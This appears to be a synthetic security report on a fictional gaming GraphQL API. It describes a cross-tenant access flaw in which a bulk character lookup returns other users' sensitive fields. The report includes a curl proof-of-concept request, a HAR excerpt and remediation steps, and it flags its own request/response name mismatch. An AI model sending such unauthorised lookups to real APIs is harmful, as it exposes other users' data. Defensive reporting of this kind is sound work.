# Security Analysis Report
**System:** RealmForge Game API
**Domain:** Gaming / Online Game Platform
**Example ID:** GQL-0282
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | Logging Failures — Pattern 7.1 | Operational PII/PHI leakage on `bulkCharacterLookup` / `getCharacter` — attacker reads game character records with PII exposed in logs and response |

---

## Finding 1 — Logging Failures: Operational PII/PHI Leakage via Character Resolver (Pattern 7.1)

### Summary
The GraphQL API at `https://api.realmforge-game-api.example.com/graphql` exposes a `bulkCharacterLookup` resolver that does not enforce ownership or tenant boundaries. The sensitive fields returned (`sensitiveField`, `internalNotes`) are logged operationally without masking, constituting PII leakage. The attacker reads character records belonging to `tenant-1faf`.

**Context.txt inconsistency (documented):** The HAR request uses `bulkCharacterLookup(ids: ["C-2282","C-1282","C-3282"])`, while the HAR response returns data under the key `getCharacter`. These names conflict. Both are faithfully reproduced here.

**Note:** `x-request-id: req-aea51faf` is a server-assigned response header; it does not appear in the outgoing request.

**Pattern:** 7.1 — Operational PII/PHI leakage (Logging Failures)
**Affected endpoint:** `POST https://api.realmforge-game-api.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack (bulk character lookup)**
```
POST https://api.realmforge-game-api.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { bulkCharacterLookup(ids: [\"C-2282\", \"C-1282\", \"C-3282\"]) { characterId tenantId data { sensitiveField } } }"}
```

**Response — Victim Game Character Record**
```json
{
  "data": {
    "getCharacter": {
      "tenantId": "tenant-1faf",
      "ownerId": "other-user-aea51faf",
      "data": {
        "sensitiveField": "CONFIDENTIAL-aea51faf",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.realmforge-game-api.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { bulkCharacterLookup(ids: [\"C-2282\",\"C-1282\",\"C-3282\"]) { characterId tenantId data { sensitiveField } } }"}'
# Vulnerable: tenantId: tenant-1faf, sensitiveField: CONFIDENTIAL-aea51faf
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must filter bulk IDs to only those belonging to the authenticated tenant.
2. Mask/redact PII fields in operational logs — never log `sensitiveField` or `internalNotes` in plain text.
3. Redis cache key must include tenant dimension.
